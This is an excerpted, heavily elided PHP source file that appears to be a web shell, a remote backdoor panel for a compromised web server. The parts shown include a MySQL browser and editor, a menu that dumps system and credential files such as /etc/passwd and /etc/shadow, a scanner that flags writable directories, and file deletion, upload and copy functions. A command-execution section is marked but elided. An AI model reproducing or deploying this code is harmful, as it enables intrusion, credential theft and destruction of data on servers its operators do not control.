...
function font($color, $text, $size = 4)
{
...
<form method='POST'>\n";
    ...
    $i = -1;
    while ($i++ < 3) {
        $text .= "<input type='text' name='" . $a[$i] . "' value='" . ((!empty($_POST[$a[$i]])) ? $_POST[$a[$i]] : ((0 == $i) ? 'localhost' : null)) . "'>\n";
    }
    ...
    if (isset($_POST['sql'])) {
        ...
        if (!empty($_POST['db'])) {
            mysql_select_db($_POST['db']) or die('Could not select db<br>');
        }
        function write($data)
        {
            switch ($_POST['save']) {
...
<table  width=100% height=100% bgcolor='#E3FFF2'><tr><td height=20 bgcolor=#dfdfdf width=100%><nobr>\n";
            if (isset($_POST['table_sel'])) {
                $c = ['Browse', 'SQL', 'Insert', 'Export'];
                $i = -1;
                while ($i++ < 3) {
                    echo "<input type=radio Name='go' value='" . ($i) . "'>" . $c[$i];
                }
            }
            echo '&nbsp;&nbsp;<b>' . ((isset($_POST['table_sel'])) ? $_POST['table_sel'] : null) . "</b></nobr></td></tr><tr width=100%><td width=100%>\n";
        }
        if (isset($_POST['push']) && isset($_POST['querysql']) && preg_match('/^\s*select /i', $_POST['querysql'])) {
            $_POST['go'] = 0;
        ...
        if (isset($_POST['editr']) && isset($_POST['edit'])) {
            $_POST['go'] = 4;
        }
        if (isset($_POST['ed_save'])) {
            $_POST['go'] = 5;
        }
        if (isset($_POST['editr']) && !isset($_POST['edit'])) {
            $_POST['go'] = 0;
            ...
            while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
                ...
                if (!isset($lk)) {
                    ...
                    foreach (array_keys($line) as $lk) {
                        echo (isset($prim) && $lk === $prim) ? "<td><u><b>$lk</b></u></td>" : "<td>$lk</td>\n";
                    }
                }
                if (!isset($prim)) {
                    while (list($key, $val) = each($line)) {
                        $up_e .= "`$key`='" . addslashes($val) . "' and ";
                    }
                    $up_e = substr($up_e, 0, -5);
                } else {
                    while (list($key, $val) = each($line)) {
                        if ($key === $prim) {
                            $up_e .= "`$key`='" . addslashes($val) . "'";
                        }
                    }
                }
                $up_e = urlencode($up_e);
...
if (!test_file('/etc/master.passwd')) {
    echo font('red', b('master.passwd readable<br>'));
}
if (!empty($_POST['th'])) {
    @chdir($_POST['th']);
}
...
<br>
<?php
$ar_file = ['/etc/passwd', '/etc/shadow', '/etc/master.passwd', '/etc/fstab', '/etc/hosts', '/proc/version', '/proc/cpuinfo', '/proc/meminfo', '/etc/httpd/conf/httpd.conf', '/usr/local/apache/conf/httpd.conf', '/etc/apache/conf/httpd.conf', '/usr/local/httpd/conf/httpd.conf', '/usr/local/etc/httpd/conf/httpd.conf', '/etc/syslog.conf'];
echo '<select name=passwd>';
foreach ($ar_file as $ar_l) {
    if (!test_file($ar_l)) {
        echo "<option value='$ar_l'>$ar_l</option>\n";
    }
}
...
<?php
for ($bch = 1; $bch <= 3; ++$bch) {
    echo"<select name=ch_p$bch>\n";
    for ($ach = 7; $ach >= 0; --$ach) {
        echo"<OPTION value=$ach>$ach</OPTION>";
    }
    echo'</select>';
}
?>
        ...
        if (is_readable($pathfw)) {
            if ($hfw = opendir($pathfw)) {
                while (false !== ($ffw = readdir($hfw))) {
                    ...
                    if (!preg_match('/\/\.+$/', $ffw)) {
                        if (is_dir($ffw)) {
                            array_push($arrfw, $ffw . '/');
                        }
                        echo is_dir($ffw) ? (is_writeable($ffw) ? font('red', "$ffw/<br>", 3) : (isset($_POST['onw']) ? null : "$ffw/<br>")) : (!isset($_POST['dy']) ? (is_writeable($ffw) ? font('green', "$ffw<br> ", 3) : (isset($_POST['onw']) ? null : "$ffw<br>")) : null);
                    }
                }
                closedir($hfw);
            }
...
if (isset($_POST['rmd']) && isset($_POST['rmdir'])) {
    if (file_exists($_POST['rmdir'])) {
        if (is_dir($_POST['rmdir'])) {
            if (@rmdir($_POST['rmdir'])) {
                echo font('green', 'dir ' . b($_POST['rmdir']) . ' delet');
            } else {
                $error = font('red', 'dir not deleted');
            }
        } else {
            $error = font('red', e(3));
        }
...
if (isset($_POST['del']) && '' != $_POST['rm']) {
    if (file_exists($_POST['rm'])) {
        if (!is_dir($_POST['rm'])) {
            ...
            echo '<br>' . font('red', e(4) . '<br>');
        }
    } else {
        echo '<br>' . font('red', e(0) . '<br>');
    }
}
//
//EXEC
...
<input type=hidden name=th value=' . getcwd() . '></form>';
    if (isset($_POST['go_up'])) {
        ...
        if (is_uploaded_file($_FILES['userfile']['tmp_name'])) {
            ...
            echo '<br>' . font('red', 'Permisions denied');
        }
    }
}
//
        ...
        if (file_exists($_POST['strin'])) {
            if (is_writable(dirname($_POST['remot']))) {
                if (is_readable($_POST['strin'])) {
                    ...
                    echo font('red', 'no read string file');
                }
            } else {
                echo font('red', 'no write dest directory');
            }
        } else {
            echo font('red', 'no such file');
        }
    } else {
        echo font('red', 'no such dest dir');
    }
}
//
//CHECK DISK
...
if (!empty($_POST['passwd']) && isset($_POST['passw'])) {
    ...
    foreach (@file($_POST['passwd']) as $fed) {
        echo $fed;
    }
    echo "</textarea><br>\n";
}
...
foreach ($arr as $f) {
    $l = @lstat($f);
    echo (is_readable($f) && is_writeable($f)) ? '<tr><td>' . w(1) . b('R' . w(1) . font('red', 'RW', 3)) . w(1) : (((is_readable($f)) ? '<tr><td>' . w(1) . b('R') . w(4) : '') . ((is_writable($f)) ? '<tr><td>' . w(1) . b(font('red', 'RW', 3)) : ''));
